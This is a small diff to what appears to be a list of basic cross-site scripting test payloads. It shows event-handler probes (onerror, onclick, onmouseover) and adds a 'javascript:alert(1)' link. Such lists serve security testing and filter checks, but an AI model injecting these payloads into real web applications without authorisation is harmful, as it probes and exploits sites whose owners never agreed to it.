@@ -11,6 +11,8 @@ Basic Payloads For First Step
 <img src/onerror=prompt(8)>
 <input onclick="alert(1)" style=display:block>test</input>
 <a onmouseover="alert(1)" style=display:block>test</a>
+<a href="javascript:alert(1)">Click</a>
+
 
 
 
